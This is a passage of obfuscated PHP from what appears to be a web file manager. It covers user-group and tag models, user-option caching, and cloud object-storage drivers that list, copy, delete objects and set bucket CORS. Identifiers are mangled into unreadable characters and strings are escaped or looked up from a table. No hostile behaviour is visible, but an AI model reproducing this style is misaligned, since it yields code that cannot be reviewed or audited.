Model($°›š¢úø[873])->listSourceRoot(SourceModel::TYPE_USER, $ÎĞúı¤›); $ìÑ·î  = array_to_keyvalue($ìÑ·î , $°›š¢úø[569]); $ìÑ·î  = array_remove_key($ìÑ·î , $°›š¢úø[569]); foreach ($ÓôÁ›á· as &$ÉŒúñ½ì) { $ÉŒúñ½ì[$°›š¢úø[90]] = $ìÑ·î [$ÉŒúñ½ì[$°›š¢úø[1747]]] ? $ìÑ·î [$ÉŒúñ½ì[$°›š¢úø[1747]]] : array(); } unset($ÉŒúñ½ì); } private function _listAppendGroup(&$ŒÛ»×ƒ, $¹Ïä¹“Ë) { $ùåÍç™· =& $_SERVER[ìïæ“œî]; $³Å¼™Ï“ = array($ùåÍç™·[1747] => array($ùåÍç™·[7], $¹Ïä¹“Ë)); $®Ù¬ºÓ» = Model($ùåÍç™·[2040])->where($³Å¼™Ï“)->select(); $ÏÉ£Õ“½ = array_to_keyvalue($®Ù¬ºÓ», $ùåÍç™·[12], $ùåÍç™·[1946]); $ÏÉ£Õ“½ = array_remove_value(array_unique($ÏÉ£Õ“½), $ùåÍç™·[228]); if (!$ÏÉ£Õ“½ || !$®Ù¬ºÓ») { return; } $³Å¼™Ï“ = array($ùåÍç™·[1946] => array($ùåÍç™·[7], $ÏÉ£Õ“½)); $ã¡®©ĞÓ = Model($ùåÍç™·[2135])->field($ùåÍç™·[2469])->where($³Å¼™Ï“)->select(); $ã¡®©ĞÓ = array_to_keyvalue($ã¡®©ĞÓ, $ùåÍç™·[1946]); $®Ù¬ºÓ» = array_to_keyvalue_group($®Ù¬ºÓ», $ùåÍç™·[1747]); foreach ($®Ù¬ºÓ» as &$Ã˜Á‘Ä×) { $­¸õû»œ = array(); foreach ($Ã˜Á‘Ä× as $îÉœì) { if (!$îÉœì[$ùåÍç™·[2054]]) { continue; } $Œæ¬¹Ø = Model($ùåÍç™·[571])->listData($îÉœì[$ùåÍç™·[2054]]); $­¸õû»œ[] = array($ùåÍç™·[1946] => $îÉœì[$ùåÍç™·[1946]], $ùåÍç™·[2470] => $ã¡®©ĞÓ[$îÉœì[$ùåÍç™·[1946]]][$ùåÍç™·[32]], $ùåÍç™·[584] => $ã¡®©ĞÓ[$îÉœì[$ùåÍç™·[1946]]][$ùåÍç™·[584]], $ùåÍç™·[487] => $Œæ¬¹Ø); } $Ã˜Á‘Ä× = $­¸õû»œ; } unset($Ã˜Á‘Ä×); foreach ($ŒÛ»×ƒ as &$Ú¬Ÿ ÷®) { $Ú¬Ÿ ÷®[$ùåÍç™·[2137]] = array(); if (isset($®Ù¬ºÓ»[$Ú¬Ÿ ÷®[$ùåÍç™·[1747]]])) { $Ú¬Ÿ ÷®[$ùåÍç™·[2137]] = $®Ù¬ºÓ»[$Ú¬Ÿ ÷®[$ùåÍç™·[1747]]]; } } unset($Ú¬Ÿ ÷®); } public function userAppendGroup($‰îôÕ©œ) { $ô”†æÀ =& $_SERVER[ìïæ“œî]; if (!$‰îôÕ©œ) { return array(); } $this->_listAppendGroup($‰îôÕ©œ, array_to_keyvalue($‰îôÕ©œ, $ô”†æÀ[12], $ô”†æÀ[1747])); return $‰îôÕ©œ; } private function _listAppendMeta(&$»ı½İÏ‡, $ÄùÂ¨ ı) { $¸êô « =& $_SERVER[ìïæ“œî]; $ØÂò‰™ş = UserJobModel::JOB_KEY; $”°’±öâ = array($¸êô «[2450]); $½ÑõğŒæ = array($¸êô «[1747] => array($¸êô «[7], $ÄùÂ¨ ı)); $ï¶Ê¤É¨ = Model($¸êô «[2448])->where($½ÑõğŒæ)->select(); $ï¶Ê¤É¨ = array_to_keyvalue_group($ï¶Ê¤É¨, $¸êô «[1747]); foreach ($ï¶Ê¤É¨ as &$ÒÒÀ¶ˆ) { $±ğ¶¢€Í = array(); foreach ($ÒÒÀ¶ˆ as $úÚ—‚ª„) { if (!in_array($úÚ—‚ª„[$¸êô «[97]], $”°’±öâ)) { $±ğ¶¢€Í[$úÚ—‚ª„[$¸êô «[97]]] = $úÚ—‚ª„[$¸êô «[450]]; } } $ÒÒÀ¶ˆ = $±ğ¶¢€Í; } unset($ÒÒÀ¶ˆ); $©êö”Ø¹ = Model($¸êô «[2471]); foreach ($»ı½İÏ‡ as &$¸¡òĞµÃ) { $£¢‘û¸‰ = array(); if (isset($ï¶Ê¤É¨[$¸¡òĞµÃ[$¸êô «[1747]]])) { $£¢‘û¸‰ = $ï¶Ê¤É¨[$¸¡òĞµÃ[$¸êô «[1747]]]; } $¸¡òĞµÃ[$¸êô «[2472]] = array(); if (isset($£¢‘û¸‰[$ØÂò‰™ş])) { $¸¡òĞµÃ[$¸êô «[2472]] = $©êö”Ø¹->getUserJobInfo($£¢‘û¸‰[$ØÂò‰™ş]); } } unset($¸¡òĞµÃ); } protected function groupUserAll($—¿ş€ø) { $Õã®ïå =& $_SERVER[ìïæ“œî]; if (!$—¿ş€ø) { return !1; } $†áÑ‰Ï¥ = Model($Õã®ïå[2040])->field($Õã®ïå[1747])->where(array($Õã®ïå[1946] => array($Õã®ïå[7], $—¿ş€ø)))->select(); $†áÑ‰Ï¥ = array_to_keyvalue($†áÑ‰Ï¥, $Õã®ïå[12], $Õã®ïå[1747]); return array_unique($†áÑ‰Ï¥); } public function userSearch($ğÄî—’, $ıÚ£á¸Î = "\52") { return Model($_SERVER[ìïæ“œî][598])->where($ğÄî—’)->field($ıÚ£á¸Î)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\157\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($°ÂÜ£Â•) { $ªÜÈèÛ =& $_SERVER[ìïæ“œî]; $Ú¬¸Âè¤ = defined($ªÜÈèÛ[2172]) && USER_ID ? USER_ID : $ªÜÈèÛ[12]; return "\x55\x73\145\x72\x4f\x70\164\151\x6f\x6e\137{$°ÂÜ£Â•}\x5f" . $Ú¬¸Âè¤; } protected function filterWhere($¬Ñà óÆ) { $ášæœè =& $_SERVER[ìïæ“œî]; $¬Ñà óÆ[$ášæœè[1747]] = defined($ášæœè[2172]) && USER_ID ? USER_ID : $ášæœè[12]; return $¬Ñà óÆ; } public function cacheRemoveUser($®òì°‘», $û†Ä’Á) { return Cache::remove("\x55\x73\145\x72\x4f\x70\164\x69\157\x6e\x5f{$®òì°‘»}\137" . $û†Ä’Á); } protected function optionDefault($çáÒ‡ê = '') { $­’¾ù¬œ =& $_SERVER[ìïæ“œî]; if ($çáÒ‡ê == $­’¾ù¬œ[12]) { return $GLOBALS[$­’¾ù¬œ[6]][$­’¾ù¬œ[2473]]; } if ($çáÒ‡ê == $­’¾ù¬œ[2474]) { return $GLOBALS[$­’¾ù¬œ[6]][$­’¾ù¬œ[2475]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\56\x74\x61\147\x4c\x69\x73\x74"; public $modelType = "\125\x73\x65\x72\117\160\164\x69\157\156"; public $field = array("\x6e\x61\x6d\x65", "\163\164\171\x6c\x65", "\163\x6f\x72\x74"); public function listData($ÉÚÑ£š = false, $ì²’ÜÏÖ = "\163\157\x72\x74", $Á ¿–†ğ = false) { return parent::listData($ÉÚÑ£š, $ì²’ÜÏÖ, $Á ¿–†ğ); } public function remove($êåÆ¯Ï®) { return parent::remove($êåÆ¯Ï®); } public function add($ÄÔÃ£ñâ, $üñ˜ÏšÅ = "\154\x61\142\145\x6c\55\147\x72\145\171\55\156\x6f\162\155\141\x6c") { $µÈÜÉÀ• =& $_SERVER[ìïæ“œî]; if ($this->findByName($ÄÔÃ£ñâ)) { return !1; } $¼–•‡ = array($µÈÜÉÀ•[494] => $ÄÔÃ£ñâ, $µÈÜÉÀ•[558] => $üñ˜ÏšÅ, $µÈÜÉÀ•[1950] => $this->getSort($µÈÜÉÀ•[335]) + 1); return parent::insert($¼–•‡); } public function update($şªÉãõ›, $»·Òí®½) { $ıÊˆ·…ä =& $_SERVER[ìïæ“œî]; $¤Ñ¸âáµ = $this->listData($şªÉãõ›); $·ÑÈ¶÷˜ = $this->findByName($»·Òí®½[$ıÊˆ·…ä[32]]); if (!$¤Ñ¸âáµ || $·ÑÈ¶÷˜ && $·ÑÈ¶÷˜[$ıÊˆ·…ä[475]] != $¤Ñ¸âáµ[$ıÊˆ·…ä[475]]) { return !1; } return parent::update($şªÉãõ›, $»·Òí®½); } public function moveTop($™Ó’èÉï) { $ßœ‹¦¸š =& $_SERVER[ìïæ“œî]; $à„ËíàÂ = parent::listData(); $óÒç«¾• = $this->getSort($ßœ‹¦¸š[334]); foreach ($à„ËíàÂ as &$€®¿’”õ) { if ($€®¿’”õ[$ßœ‹¦¸š[475]] == $™Ó’èÉï) { $€®¿’”õ[$ßœ‹¦¸š[1970]] = $óÒç«¾•; continue; } $€®¿’”õ[$ßœ‹¦¸š[1970]] += 1; } unset($€®¿’”õ); return parent::resetData($à„ËíàÂ); } public function moveBottom($®ÛÔø«) { $ÂÔó¿ãË =& $_SERVER[ìïæ“œî]; $‘á˜‘ğ = $this->getSort($ÂÔó¿ãË[335]) + 1; return parent::update($®ÛÔø«, array($ÂÔó¿ãË[1970] => $‘á˜‘ğ)); } public function resetSort($äÛøÒÆˆ) { $ñÛ¤”é =& $_SERVER[ìïæ“œî]; $£ôî±ÅĞ = array(); $äÛøÒÆˆ = is_array($äÛøÒÆˆ) ? $äÛøÒÆˆ : array(); for ($é“†’˜ø = 0; $é“†’˜ø < count($äÛøÒÆˆ); $é“†’˜ø++) { $£ôî±ÅĞ[$äÛøÒÆˆ[$é“†’˜ø] . $ñÛ¤”é[12]] = $é“†’˜ø + 1; } $´€ñ¾í = parent::listData(); foreach ($´€ñ¾í as &$®Å¥ğ°ê) { $áçºîã› = $£ôî±ÅĞ[$®Å¥ğ°ê[$ñÛ¤”é[475]]]; $®Å¥ğ°ê[$ñÛ¤”é[1970]] = $áçºîã› ? $áçºîã› : $®Å¥ğ°ê[$ñÛ¤”é[1970]]; } unset($®Å¥ğ°ê); return parent::resetData($´€ñ¾í); } private function getSort($üÄä¯çÏ) { $Ñœ³îœ =& $_SERVER[ìïæ“œî]; $şå£¾¦¥ = parent::listData(); $Ú×ÇÔù¬ = array_to_keyvalue($şå£¾¦¥, $Ñœ³îœ[12], $Ñœ³îœ[1970]); if (!$Ú×ÇÔù¬) { $Ú×ÇÔù¬ = array(0); } $áĞÙ›ùÜ = $üÄä¯çÏ == $Ñœ³îœ[335] ? max($Ú×ÇÔù¬) : min($Ú×ÇÔù¬); return intval($áĞÙ›ùÜ); } } goto DÓ…¨è¡”“; d³ƒÖ³åÚº: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¡Üà½ºá) { parent::__construct($¡Üà½ºá); $this->setSignVersion($_SERVER[ìïæ“œî][247]); } public function fileOutImage($ñ¤Ä½§ë, $Ü¦ô„˜ = 250) { $õÃÁ¤ˆ =& $_SERVER[ìïæ“œî]; if ($this->size($ñ¤Ä½§ë) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ñ¤Ä½§ë, $Ü¦ô„˜); } $÷Ö’»Šô = array($õÃÁ¤ˆ[1436] => $õÃÁ¤ˆ[1437] . $Ü¦ô„˜ . $õÃÁ¤ˆ[1438]); $ÖŸ¡ÈÖ = $this->link($ñ¤Ä½§ë, $÷Ö’»Šô); $this->fileOutLink($ÖŸ¡ÈÖ); } public function fileOutLink($É†¥ËÀı) { $¶Éí³Üõ =& $_SERVER[ìïæ“œî]; if (substr($É†¥ËÀı, 0, 7) == $¶Éí³Üõ[313]) { $É†¥ËÀı = $¶Éí³Üõ[314] . substr($É†¥ËÀı, 7); } header($¶Éí³Üõ[175] . $É†¥ËÀı); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($€Ãß‰ıõ) { parent::__construct($€Ãß‰ıõ); $this->setSignVersion($_SERVER[ìïæ“œî][247]); } public function fileOutLink($ºúê–¹) { $è–üØŸŞ =& $_SERVER[ìïæ“œî]; if (substr($ºúê–¹, 0, 7) == $è–üØŸŞ[313]) { $ºúê–¹ = $è–üØŸŞ[314] . substr($ºúê–¹, 7); } header($è–üØŸŞ[175] . $ºúê–¹); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($¯›ÌÎŒ°) { parent::__construct(); include_once SDK_DIR . $_SERVER[ìïæ“œî][1439]; $this->_init($¯›ÌÎŒ°); } public function _init($¬¿«Ø®¾) { $Œ¿¾Ì =& $_SERVER[ìïæ“œî]; $this->config = $¬¿«Ø®¾; foreach ($¬¿«Ø®¾ as $¸‰ÖÈŠ => $òÈü“­ó) { if (isset($this->{$¸‰ÖÈŠ})) { $this->{$¸‰ÖÈŠ} = $òÈü“­ó; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Œ¿¾Ì[1440] . LNG($Œ¿¾Ì[1441])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $üÇ–´¾ =& $_SERVER[ìïæ“œî]; $êŠï ë» = new OSS\Model\CorsConfig(); $µ€ÃÇç… = new OSS\Model\CorsRule(); $µ€ÃÇç…->addAllowedOrigin($üÇ–´¾[1442]); $µ€ÃÇç…->addAllowedMethod($üÇ–´¾[1443]); $µ€ÃÇç…->addAllowedMethod($üÇ–´¾[1444]); $µ€ÃÇç…->addAllowedMethod($üÇ–´¾[1445]); $µ€ÃÇç…->addAllowedMethod($üÇ–´¾[1446]); $µ€ÃÇç…->addAllowedMethod($üÇ–´¾[165]); $µ€ÃÇç…->setMaxAgeSeconds(600); $µ€ÃÇç…->addExposeHeader($üÇ–´¾[1447]); $µ€ÃÇç…->addAllowedHeader($üÇ–´¾[1442]); $êŠï ë»->addRule($µ€ÃÇç…); try { $this->client->putBucketCors($this->bucket, $êŠï ë»); } catch (OSS\Core\OssException $ùŸØ™ÇÓ) { $this->writeLog(__FUNCTION__ . $üÇ–´¾[214] . $ùŸØ™ÇÓ->getMessage()); return !1; } return !0; } public function getBucketCors() { $…¸í³şà =& $_SERVER[ìïæ“œî]; $Å·™ç¤Ÿ = null; try { $Å·™ç¤Ÿ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $üíß…‹”) { $this->writeLog(__FUNCTION__ . $…¸í³şà[214] . $üíß…‹”->getMessage()); return null; } if (!$Å·™ç¤Ÿ || !($ïÊšõó = $Å·™ç¤Ÿ->getRules())) { return null; } $Ï†¡¹÷ô = $ïÊšõó[0]->getAllowedOrigins(); $§ÜÙşÁ = $ïÊšõó[0]->getAllowedMethods(); $…¬€Ñ = $ïÊšõó[0]->getMaxAgeSeconds(); $›é³‹‘ = $ïÊšõó[0]->getExposeHeaders(); $•òº†—£ = $ïÊšõó[0]->getAllowedHeaders(); return array($…¸í³şà[218] => isset($Ï†¡¹÷ô[0]) ? $Ï†¡¹÷ô[0] : $…¸í³şà[12], $…¸í³şà[222] => $§ÜÙşÁ, $…¸í³şà[1448] => $…¬€Ñ, $…¸í³şà[1449] => isset($›é³‹‘[0]) ? $›é³‹‘[0] : $…¸í³şà[12], $…¸í³şà[219] => isset($•òº†—£[0]) ? $•òº†—£[0] : $…¸í³şà[12]); } public function isBucketCors() { $ß¸…Ó§¥ =& $_SERVER[ìïæ“œî]; $©¾¹ˆàÔ = $this->getBucketCors(); if (!$©¾¹ˆàÔ || !is_array($©¾¹ˆàÔ)) { return !1; } if ($©¾¹ˆàÔ[$ß¸…Ó§¥[218]] != $ß¸…Ó§¥[220] || $©¾¹ˆàÔ[$ß¸…Ó§¥[219]] != $ß¸…Ó§¥[220]) { return !1; } $õ²÷ŞŸä = array_map($ß¸…Ó§¥[221], $©¾¹ˆàÔ[$ß¸…Ó§¥[222]]); if (!is_array($õ²÷ŞŸä)) { $õ²÷ŞŸä = array(); } $ëŞ·Ã²– = array($ß¸…Ó§¥[223], $ß¸…Ó§¥[224], $ß¸…Ó§¥[225], $ß¸…Ó§¥[226], $ß¸…Ó§¥[227]); $¼Öœ²ş = array_diff($ëŞ·Ã²–, $õ²÷ŞŸä); return empty($¼Öœ²ş); } public function mkfile($æÙÄÛ•‚, $ïî±ğÏ· = '', $¹öÎ¯É¿ = REPEAT_RENAME) { $†ÇæÍÄÀ = $this->setContent($æÙÄÛ•‚, $ïî±ğÏ·); if ($†ÇæÍÄÀ !== !1) { return $this->getPathOuter($æÙÄÛ•‚); } return !1; } public function mkdir($Úê÷í÷ï, $å¨œ·•Ë = REPEAT_SKIP) { if ($å¨œ·•Ë && $this->_isFolder($Úê÷í÷ï)) { return $this->getPathOuter($Úê÷í÷ï); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Úê÷í÷ï)); } catch (OSS\Core\OssException $ÔÛ´šÅÕ) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][214] . $ÔÛ´šÅÕ->getMessage()); return !1; } return $this->getPathOuter($Úê÷í÷ï); } private function fileList($¥·ú‘Ùú, $‰ÜÈê± = '', $óé®Ã¶ñ = 0) { $ÄÑ¿—º =& $_SERVER[ìïæ“œî]; $¥·ú‘Ùú = trim($¥·ú‘Ùú, $ÄÑ¿—º[8]); $Æ¤´ˆÉĞ = empty($¥·ú‘Ùú) && $¥·ú‘Ùú !== $ÄÑ¿—º[228] ? $ÄÑ¿—º[12] : $¥·ú‘Ùú . $ÄÑ¿—º[8]; $¥ûâ÷²Ò = $ÄÑ¿—º[12]; $´Ñ¯ŠÖ = 1000; $ßÂê¡“ğ = $Ü¿¦ã¿ = array(); while (!0) { check_abort(); $–ãàŠüÁ = array($ÄÑ¿—º[1450] => $‰ÜÈê±, $ÄÑ¿—º[1451] => $Æ¤´ˆÉĞ, $ÄÑ¿—º[1452] => $´Ñ¯ŠÖ, $ÄÑ¿—º[1453] => $¥ûâ÷²Ò); try { $è´ÔĞÌ° = $this->client->listObjects($this->bucket, $–ãàŠüÁ); } catch (OSS\Core\OssException $ªÏÑ¦Óè) { $this->writeLog(__FUNCTION__ . $ÄÑ¿—º[214] . $ªÏÑ¦Óè->getMessage()); break; } $¥ûâ÷²Ò = $è´ÔĞÌ°->getNextMarker(); $­’¸ˆ£³ = $è´ÔĞÌ°->getObjectList(); $Ìü¾ÙÃ— = $è´ÔĞÌ°->getPrefixList(); foreach ($­’¸ˆ£³ as $¯šÊŒë²) { if ($¯šÊŒë²->getKey() == $Æ¤´ˆÉĞ) { continue; } $’¼‚û¢ú = $¯šÊŒë²->getKey(); $œ¬œ¼Öâ = $¯šÊŒë²->getSize(); $·±ÇØÒÍ = $¯šÊŒë²->getLastModified(); $ë¤·Ùø™ = trim($¯šÊŒë²->getETag(), $ÄÑ¿—º[121]); $–æ¼Íä = $óé®Ã¶ñ ? array($ÄÑ¿—º[32] => $’¼‚û¢ú, $ÄÑ¿—º[79] => $œ¬œ¼Öâ, $ÄÑ¿—º[206] => strtotime($·±ÇØÒÍ), $ÄÑ¿—º[1454] => $ë¤·Ùø™) : $’¼‚û¢ú; $–Öšé«œ = $œ¬œ¼Öâ == 0 && substr($’¼‚û¢ú, strlen($’¼‚û¢ú) - 1, 1) == $ÄÑ¿—º[8] ? !0 : !1; $ÎúÙ÷ºİ = array($ÄÑ¿—º[79] => $œ¬œ¼Öâ, $ÄÑ¿—º[1455] => $œ¬œ¼Öâ, $ÄÑ¿—º[88] => strtotime($·±ÇØÒÍ), $ÄÑ¿—º[1456] => $·±ÇØÒÍ, $ÄÑ¿—º[1454] => $ë¤·Ùø™); $this->cacheMethodInfoSet($’¼‚û¢ú, $–Öšé«œ, $ÎúÙ÷ºİ); if ($–Öšé«œ) { $ßÂê¡“ğ[] = $’¼‚û¢ú; continue; } $Ü¿¦ã¿[] = $–æ¼Íä; } foreach ($Ìü¾ÙÃ— as $çŠĞôœ£) { $ßÂê¡“ğ[] = $çŠĞôœ£->getPrefix(); $this->cacheMethodInfoSet($çŠĞôœ£->getPrefix(), !0); } if ($¥ûâ÷²Ò === $ÄÑ¿—º[12]) { break; } } $this->cacheMethodInfoSet($¥·ú‘Ùú, !0); return array($ÄÑ¿—º[85] => $ßÂê¡“ğ, $ÄÑ¿—º[86] => $Ü¿¦ã¿); } public function listObject($Û†äıÏ, $ì€İ = '') { $áÑë…ïÏ =& $_SERVER[ìïæ“œî]; $Û†äıÏ = trim($Û†äıÏ, $áÑë…ïÏ[8]); $¶Œ¥‡’İ = empty($Û†äıÏ) && $Û†äıÏ !== $áÑë…ïÏ[228] ? $áÑë…ïÏ[12] : $Û†äıÏ . $áÑë…ïÏ[8]; $Ÿ°¹Ö¯ = $áÑë…ïÏ[12]; $ñ¯´Ú¸ = 1000; $£ÉÄ·üö = $“ç¯¡¦ò = array(); while (!0) { check_abort(); $×¤¿Î¦¯ = array($áÑë…ïÏ[1450] => $ì€İ, $áÑë…ïÏ[1451] => $¶Œ¥‡’İ, $áÑë…ïÏ[1452] => $ñ¯´Ú¸, $áÑë…ïÏ[1453] => $Ÿ°¹Ö¯); try { $¬ÀÑñ´œ = $this->client->listObjects($this->bucket, $×¤¿Î¦¯); } catch (OSS\Core\OssException $áİ†Ü‹ˆ) { $this->writeLog(__FUNCTION__ . $áÑë…ïÏ[214] . $áİ†Ü‹ˆ->getMessage()); break; } $Ÿ°¹Ö¯ = $¬ÀÑñ´œ->getNextMarker(); $†±ÈÒàĞ = $¬ÀÑñ´œ->getObjectList(); foreach ($†±ÈÒàĞ as $€¨ô²) { if ($€¨ô²->getKey() == $¶Œ¥‡’İ) { continue; } $¾Éæ†è = $€¨ô²->getKey(); $¢»ª¬£Ó = $€¨ô²->getSize(); $¤ßô•¶‘ = $¢»ª¬£Ó == 0 && substr($¾Éæ†è, strlen($¾Éæ†è) - 1, 1) == $áÑë…ïÏ[8] ? !0 : !1; if ($¤ßô•¶‘) { continue; } (yield $¢»ª¬£Ó . $áÑë…ïÏ[214] . $¾Éæ†è); } if ($Ÿ°¹Ö¯ === $áÑë…ïÏ[12]) { break; } } } public function copyFile($™ØÁêí, $ñ¸îÆ£ã) { $„´÷âİ” = $this->size($™ØÁêí); if ($„´÷âİ” < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $™ØÁêí, $this->bucket, $this->pathEncode($ñ¸îÆ£ã)); } catch (OSS\Core\OssException $’šŒï¼) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][214] . $’šŒï¼->getMessage()); return !1; } return $this->getPathOuter($ñ¸îÆ£ã); } $ÏÛİ§ªŞ = $this->multiCopyObject($™ØÁêí, $ñ¸îÆ£ã, $„´÷âİ”); return $ÏÛİ§ªŞ ? $this->getPathOuter($ñ¸îÆ£ã) : !1; } private function multiCopyObject($©‰Î—¬, $Õ¢€ãû, $Õâ¼æ) { $¾Œ¦î½Œ =& $_SERVER[ìïæ“œî]; try { $–Ğ¢Ï¸ = array(); if ($×Âô¨—’ = $this->hashMd5($©‰Î—¬)) { $–Ğ¢Ï¸ = array(OSS\OssClient::OSS_HEADERS => array($¾Œ¦î½Œ[1457] => $×Âô¨—’)); } $˜Ğßç° = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Õ¢€ãû), $–Ğ¢Ï¸); $Òéşˆ˜° = 1; $Â†³‹ü± = 0; $’÷–Óú = array(); $Úíø±ş = 1024 * 1024 * 10; $®£‰å£ = $this->client->generateMultiuploadParts($Õâ¼æ, $Úíø±ş); foreach ($®£‰å£ as $Øêœ—ë¯ => $ìÆ×öæÇ) { $é©çºÉŠ = $Â†³‹ü± + (int) $ìÆ×öæÇ[$¾Œ¦î½Œ[1458]]; $’ÊïÆÇî = (int) $ìÆ×öæÇ[$¾Œ¦î½Œ[413]] + $é©çºÉŠ - 1; $¼åÀÂæõ = array($¾Œ¦î½Œ[167] => $é©çºÉŠ, $¾Œ¦î½Œ[168] => $’ÊïÆÇî); $’÷–Óú[] = $this->client->uploadPartCopy($this->bucket, $©‰Î—¬, $this->bucket, $this->pathEncode($Õ¢€ãû), $Òéşˆ˜°, $˜Ğßç°, $¼åÀÂæõ); $Òéşˆ˜° = $Òéşˆ˜° + 1; } $°ºÏä—ç = array(); foreach ($’÷–Óú as $Øêœ—ë¯ => $ÏûšĞ¶) { $°ºÏä—ç[] = array($¾Œ¦î½Œ[308] => $Øêœ—ë¯ + 1, $¾Œ¦î½Œ[309] => $ÏûšĞ¶); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Õ¢€ãû), $˜Ğßç°, $°ºÏä—ç); } catch (OSS\Core\OssException $Æí²˜Œ›) { $this->writeLog(__FUNCTION__ . $¾Œ¦î½Œ[214] . $Æí²˜Œ›->getMessage()); return !1; } return !0; } public function moveFile($ÁˆÇÇã, $“ÈìÇÑ) { if ($this->copyFile($ÁˆÇÇã, $“ÈìÇÑ)) { $this->remove($ÁˆÇÇã); return $this->getPathOuter($“ÈìÇÑ); } return !1; } public function delFile($­èÕÜüÀ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($­èÕÜüÀ)); } catch (OSS\Core\OssException $ò¶±ñ¼) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][214] . $ò¶±ñ¼->getMessage()); return !1; } return !0; } public function delFolder($ÛÈÔŞôÛ) { $×Å‚©ò© =& $_SERVER[ìïæ“œî]; if (!$this->exist($ÛÈÔŞôÛ)) { return !0; } $this->listItemCache = !1; $¶îàö†å = $this->fileList($ÛÈÔŞôÛ); $this->listItemCache = !0; $²âÇÉì¯ = trim($ÛÈÔŞôÛ, $×Å‚©ò©[8]) . $×Å‚©ò©[8]; if (!empty($ÛÈÔŞôÛ) && $ÛÈÔŞôÛ !== $×Å‚©ò©[228] && !in_array($²âÇÉì¯, $¶îàö†å[$×Å‚©ò©[85]])) { $¶îàö†å[$×Å‚©ò©[85]][] = $²âÇÉì¯; } $†í§˜º® = $this->delByBatch($¶îàö†å[$×Å‚©ò©[86]]); if (!$†í§˜º®) { return !1; } $†í§˜º® = $this->delByBatch($¶îàö†å[$×Å‚©ò©[85]]); if (!$†í§˜º®) { return !1; } return $this->delFile($²âÇÉì¯); } private function delByBatch($­ñ˜âßì) { foreach (array_chunk($­ñ˜âßì, 1000) as $ì³åå²ö) { try { $this->client->deleteObjects($this->bucket, $ì³åå²ö); } catch (OSS\Core\OssException $Ú±˜é¶ò) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][214] . $Ú±˜é¶ò->getMessage()); return !1; } } return !0; } public function rename($½ëª¯»×, $ÔÂı¤ë) { return $this->renameObject($½ëª¯»×, $ÔÂı¤ë); } private function fileInfo($ãåÆªëã, $Í áü‰ë = false, $£Í¹èî¢ = array()) { $ÀèÆäëñ =& $_SERVER[ìïæ“œî]; $Ğ˜ì¤Í = array($ÀèÆäëñ[32] => $this->pathThis($ãåÆªëã), $ÀèÆäëñ[87] => $this->getPathOuter($ãåÆªëã), $ÀèÆäëñ[33] => $ÀèÆäëñ[230], $ÀèÆäëñ[79] => isset($£Í¹èî¢[$ÀèÆäëñ[79]]) ? $£Í¹èî¢[$ÀèÆäëñ[79]] : 0, $ÀèÆäëñ[169] => $this->ext($ãåÆªëã)); if ($Í áü‰ë) { return $Ğ˜ì¤Í; } $Ğ˜ì¤Í[$ÀèÆäëñ[231]] = $Ğ˜ì¤Í[$ÀèÆäëñ[88]] = 0; $Ğ˜ì¤Í[$ÀèÆäëñ[232]] = $Ğ˜ì¤Í[$ÀèÆäëñ[233]] = !0; if (empty($£Í¹èî¢)) { $µÆâæ¢¶ = $this->objectMeta($ãåÆªëã); if (!$µÆâæ¢¶) { return $Ğ˜ì¤Í; } $£Í¹èî¢ = array($ÀèÆäëñ[88] => strtotime($µÆâæ¢¶[$ÀèÆäëñ[1456]]), $ÀèÆäëñ[79] => $µÆâæ¢¶[$ÀèÆäëñ[1455]] + 0, $ÀèÆäëñ[1454] => $µÆâæ¢¶[$ÀèÆäëñ[1454]]); } if (isset($£Í¹èî¢[$ÀèÆäëñ[1454]]) && $£Í¹èî¢[$ÀèÆäëñ[1454]]) { $Ğ˜ì¤Í[$ÀèÆäëñ[235]] = trim($£Í¹èî¢[$ÀèÆäëñ[1454]], $ÀèÆäëñ[121]); } if (isset($£Í¹èî¢[$ÀèÆäëñ[79]])) { $Ğ˜ì¤Í[$ÀèÆäëñ[79]] = $£Í¹èî¢[$ÀèÆäëñ[79]]; } if (isset($£Í¹èî¢[$ÀèÆäëñ[88]])) { $Ğ˜ì¤Í[$ÀèÆäëñ[88]] = $£Í¹èî¢[$ÀèÆäëñ[88]]; } if (isset($£Í¹èî¢[$ÀèÆäëñ[206]]) && !trim($Ğ˜ì¤Í[$ÀèÆäëñ[88]])) { $Ğ˜ì¤Í[$ÀèÆäëñ[88]] = $£Í¹èî¢[$ÀèÆäëñ[206]]; } return $Ğ˜ì¤Í; } private function folderInfo($æ¦†˜”Ã, $¿á‹»¥ = false, $¢ÒÙõÂ‡ = array()) { $ŞÎò½Úô =& $_SERVER[ìïæ“œî]; $ŠİÄôú’ = array($ŞÎò½Úô[32] => $this->pathThis($æ¦†˜”Ã), $ŞÎò½Úô[87] => $this->getPathOuter($ŞÎò½Úô[8] . $æ¦†˜”Ã), $ŞÎò½Úô[33] => $ŞÎò½Úô[78]); if ($¿á‹»¥) { return $ŠİÄôú’; } $ŠİÄôú’[$ŞÎò½Úô[231]] = $ŠİÄôú’[$ŞÎò½Úô[88]] = 0; $ŠİÄôú’[$ŞÎò½Úô[232]] = $ŠİÄôú’[$ŞÎò½Úô[233]] = !0; if (empty($¢ÒÙõÂ‡)) { 